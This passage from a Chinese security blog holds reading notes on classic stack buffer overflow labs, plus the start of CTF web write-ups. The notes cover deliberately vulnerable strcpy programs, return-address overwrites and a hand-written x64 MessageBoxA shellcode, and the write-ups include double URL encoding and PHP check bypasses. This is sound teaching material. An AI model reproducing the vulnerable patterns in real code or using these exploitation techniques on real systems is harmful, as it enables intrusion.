href="https://gitbook.coder.cat/function-call-principle/content/storage-of-local-variables.html">关于局部变量的存储</a>，这里书里没有讲，寄存器和内存都可以用来存放<code>函数执行时</code>所需的<code>数据</code>。寄存器的存取速度比内存快很多，所以通常会优先把数据存入寄存器中。但是由于寄存器数量有限，因此当寄存器不够用时会将数据存放在栈内存中。</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_11-14-28.png" class=""><h3 id="修改临界变量"><a href="#修改临界变量" class="headerlink" title="修改临界变量"></a>修改临界变量</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在系统栈中存在某一种可能的情况，局部变量紧挨着排列，当局部变量中存在数组之类的缓冲区时，并且在赋值时数组可以发生越界，那么越界的数组元素可能破坏相邻变量的值，甚至当紧挨着<code>EBP</code>时，从而修改<code>EBP</code>、返回地址等等。</p><h4 id="crack-me2"><a href="#crack-me2" class="headerlink" title="crack_me2"></a>crack_me2</h4><p>人为制造溢出：</p><p>注意<code>buffer</code>的声明位置</p><p>我们的目标是溢出到返回值，让其返回1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"3xsh0re"</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG     <span class="hljs-string">"flag{stack_overflow_right?}"</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>];<span class="hljs-comment">// add local buffto be overflowed </span><br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    { <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"please input password: "</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n\n"</span>); <br>        } <br>   <span class="hljs-keyword">else</span> <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have got the flag:%s\n"</span>,FLAG); <br>            <span class="hljs-keyword">break</span>; <br>        } <br>    } <br>} <br></code></pre></td></tr></table></figure><p>此时笔者转去学习<code>x64dbg</code>了，不然用起来很不顺手🤣，如果需要了解简单的用法，见上一篇博客</p><p>浅浅学习归来，</p><p>首先将程序拖进<code>x64dbg</code>，然后寻找验证函数的位置，在此模块搜索字符串，然后定位到大致位置</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-30-13.png" class=""><p>分析一下：大概在读取输入之后，调用了地址<code>0000000000401550</code>处的函数，找到该处</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-32-16.png" class=""><p>挺近的，可以发现<code>push rbp</code>压入栈底，然后在call完<code>strcpy</code>函数后打下断点</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-34-18.png" class=""><p>那么我们先运行程序到输入密码处，然后输入密码，开始调试程序</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-01_21-22-37.png" class=""><p>进入断点，此时我们知道存在一个<code>strcpy</code>函数，那么之后会有一个返回值，在内存中找到返回值的地方，选中上断点的反汇编代码，然后在详细信息表格中双击将要写入eax寄存器的那个内存的地址，然后会在内存试图里显示，由于我这里输入的是<code>xxxxxxx</code>，所以值是1，当然不能通过验证</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-52-58.png" class=""><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-58-52.png" class=""><p>如果我们输入8个<code>x</code>呢，可以发现，返回标志被溢出的换行符替换为0了，即可通过验证！</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-56-38.png" class=""><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-00-03.png" class=""><p>至于为什么是8个<code>x</code>，其实很好理解，因为定义的是一个8个字符的数组哒！刚好最后一个截断字符溢出哒！</p><p>刚好我们人为制造的字符数组和Auth相邻哒！</p><p>但是你会意外的发现，如果输入字符串小于<code>3xsh0re</code>，即使输入8个字符也不能冲破验证，这是因为小于则<code>strcmp</code>函数的返回值为-1，那么就会导致Auth的值为0xFFFFFFFF，就算淹没了两个字节变为0xFFFFFF00也无济于事的🤣</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-17-24.png" class=""><p>当然笔者这里还有一个办法，想办法在输入中跟上7个截断字符，刚好淹没所有的Auth，当然这里在命令行里输入不太方便，然后笔者发现在之后的crack实验，我们通过文件读取的方式可以实现！😎</p><h3 id="控制程序执行的流程"><a href="#控制程序执行的流程" class="headerlink" title="控制程序执行的流程"></a>控制程序执行的流程</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>​我们通过上面的学习，已经知道利用栈溢出可以修改邻接变量，更通用、更强大的攻击通过缓冲区溢出改写的目标往往不是某一个变量，而是瞄准栈帧最下方的 EBP 和函数返回地址等栈帧状态值。</p><h4 id="crack-me3"><a href="#crack-me3" class="headerlink" title="crack_me3"></a>crack_me3</h4><p>​用键盘输入字符的 ASCII 表示范围有限，很多值（如 0x11、0x12 等符号）无法直接用键盘输入，所以我们把用于实验的代码稍作改动，将程序的输入由键盘改为从文件中读取字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"3xsh0re"</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">"password.txt"</span>,<span class="hljs-string">"rw+"</span>))) <br>    { <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    } <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">"%s"</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    { <br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n"</span>); <br>    } <br>    <span class="hljs-keyword">else</span> <br>    { <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have passed the verification!\n"</span>); <br>    } <br>    fclose(fp); <br>}<br></code></pre></td></tr></table></figure><p>将上面的代码编译为exe，然后在同级目录下创建password.txt文件。</p><p>在动手之前，理清思路：</p><p>1.我们需要摸清楚栈中的状况</p><p>2.破解目标是通过密钥验证，所以应该知道密钥验证通过的指令地址</p><p>3.通过文件缓冲区溢出在返回地址处填上地址</p><p>通过x64dbg打开之前的编译好的文件，找到验证通过的指令地址。可以通过右键查找用户模块字符串快速找到。</p><p>可以得到地址为0x0000 0000 0040 161B，这里因为是在x86-64下，地址为64位，不同于书上是32位的。那么我们之后覆盖的返回值地址就是这里了😋</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_11-14-28.png" class=""><p>然后我们找到缓冲区的位置，首先在password.txt里输入“1234”，然后在通过调试在验证函数的下面这个地方打上断点：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-11-03.png" class=""><p>然后在堆栈区找到我们的缓冲区地址：我们这里是0000 0000 0061 F9D0，可以发现其中填充的是“34333231”，正是我们的输入。</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-13-46.png" class=""><p>接下来就是制作我们的payload了，从上面的图可以发现，要淹没返回值需要5*4个无效字节加上构造的返回值地址，这里为什么是5个不是6个，因为对于双字数据，在内存中的存放按照从地址低到高这里也就是1234，而在作为数值时是从高到低的，这是由于调试器的原因会在堆栈区按数值显示，也就是对于00..061F9D0的偏移在栈中是7-&gt;0，所以是填充6个。</p><p>使用winhex编辑txt文件的16进制，内容如下：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-19-01.png" class=""><p>然后运行，成功！</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-21-12.png" class=""><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-20-10.png" class=""><h3 id="在缓冲区植入代码"><a href="#在缓冲区植入代码" class="headerlink" title="在缓冲区植入代码"></a>在缓冲区植入代码</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>我们已经完成修改返回地址的壮举！😋那么我们为何不将返回地址改到我们自己的输入上呢，这样不就可以执行我们自己的代码了，那么我们的代码放哪，放缓冲区噻，之前填充的是无用的数值，填充指令不就可以了。</p><h4 id="crack-me4"><a href="#crack-me4" class="headerlink" title="crack_me4"></a>crack_me4</h4><p>和实验3一样通过文件读取，不过改了缓冲区大小，加入了包含窗口调用dll。目的是在缓冲区填充弹窗的代码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span> <span class="hljs-comment">//包含user32.dll</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"3xsh0re"</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">44</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    LoadLibrary(<span class="hljs-string">"user32.dll"</span>);<span class="hljs-comment">//prepare for messagebox </span><br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">"password.txt"</span>,<span class="hljs-string">"rw+"</span>))) <br>    { <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    } <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">"%s"</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n"</span>); <br>    } <br>    <span class="hljs-keyword">else</span> <br>    { <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have passed the verification!\n"</span>); <br>    } <br>    fclose(fp); <br>}<br></code></pre></td></tr></table></figure><p>和之前一样需要获得函数调用在内存中的返回返回到缓冲区的地址，打开x64dbg，开调！</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-56-32.png" class=""><p>根据之前的调试方法，我们可以找到缓冲区的地址：0000 0000 0061 F9B0，接下来就需要我们编写password.txt里的内容了，肯定是要淹没到返回地址的位置的，看看上面的堆栈信息，可以发现我们需要设置7*12345678+缓冲区地址。在Winhex里编辑如下：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-29-16.png" class=""><p>调试一下，发现成功淹没</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-31-00.png" class=""><p>接下来就是编写我们植入的代码，我们需要定位到内存中MessageBox的地址，这里不沿用书的方法，我们直接在x64dbg中查看符号文件，搜索即可得到地址为：0x00007FFB294DA000</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-25-41.png" class=""><p>然后编写shellcode：这里笔者花了大量的时间来写shellcode，</p><p><strong>第一个问题是一开始没有调高栈顶，也就是没有对rsp进行修改，导致运行时新入栈的值淹没了我的shellcode，所以调高了栈顶</strong></p><p><strong>第二个问题是发现无法在堆栈中执行命令，尝试在系统中关闭了DEP，但是还是不行，然后在调试器中，右键转到内存，然后右键该区域，内存权限，修改为可执行权限即可</strong></p><p><strong>第三个问题是发现64位的地址中会有0x00，不可避免，选择使用逻辑移位的方式构造跳转地址。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SUB rsp,64;调高栈顶，防止栈帧破坏shellcode<br>XORebx,ebx;得0<br>PUSHebx<br>MOV rax,0x3378736830726521;!er0hsx3<br>PUSHrax<br>MOVrax,rsp;将字符串指针给rax<br>PUSHebx;压入函数参数<br>PUSHrax<br>PUSHrax<br>PUSHebx<br>MOVrax,0x7FFB294DA0;防止0x00被截断，使用移位的方式构造函数地址<br>SHLrax,24<br>SHRrax,16<br>CALLrax;call MessageBoxA<br>ADDrsp,64;回收栈顶<br></code></pre></td></tr></table></figure><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-06-05.png" class=""><p>·<img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-21-16.png" class=""></p><p>右键修改可执行权限</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-22-12.png" class=""><p>全选然后设置权限</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-23-02.png" class=""><p>发现已经执行到MessageBoxA函数处😁：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-24-55.png" class=""><p>最后一个问题没有解决！为什么不弹窗！为什么！😅</p><p>第二章就结束了，虽然最后有个小遗憾，但是笔者已经花了大量的时间动手去完成任务，并且效果还不错，所以就不纠结于弹窗了哈哈😀</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-攻防世界-WEB-WP</title>
    <link href="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/"/>
    <url>/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/</url>
    
    <content type="html"><![CDATA[<p>好久没有做过web了，偶然翻到之前笔者曾经做过的一些攻防世界-WEB题目写的题解🐸，本人菜鸡一个😭😭😭😭</p><span id="more"></span><h4 id="1-PHP2"><a href="#1-PHP2" class="headerlink" title="1_PHP2"></a>1_PHP2</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>打开只有一个显示，“Can you anthenticate to this website?”，检查源代码也没有其他显示。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp1.jpg" class=""><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p>- </p><p>  <strong>phps文件就是php的源代码文件</strong>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p><ul><li>浏览器在将请求传回服务端时会对url解码一次后传回。</li></ul><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先访问index.php，回显没有变化。试着访问源码phps文件index.phps，发现源码</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp2.jpg" class=""><p>源码分析：当输入url中输入id=admin时，echo“not allowed!”，不是想要的结果。</p><p>我们发现浏览器会对url解码一次，然后urldecode再对url解码一次，相当于对url解码了两次，所以我们再url后跟的应该有url编码两次后的字符，查表，将字符a写为%25%36%31，浏览器解码一次后变为%61，再经过urlencode解码一次后为a，通过检验。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp3.jpg" class=""><h4 id="2-EasyPHP"><a href="#2-EasyPHP" class="headerlink" title="2_EasyPHP"></a>2_EasyPHP</h4><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>直接进入，发现php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>) &gt; <span class="hljs-number">6000000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>) &lt;= <span class="hljs-number">3</span>){      <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>) &amp;&amp; <span class="hljs-string">'8b184b'</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">6</span>,<span class="hljs-number">6</span>)){<br>        <span class="hljs-variable">$key1</span> = <span class="hljs-number">1</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Emmm...再想想"</span>);<br>        }<br>    }<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Emmm..."</span>);<br>}<br><br><span class="hljs-variable">$c</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">"m"</span>]) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-string">"m"</span>] &gt; <span class="hljs-number">2022</span>){<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]) == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>][<span class="hljs-number">0</span>])){<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"DGGJ"</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]);<br>        <span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no..."</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>){<br>            <span 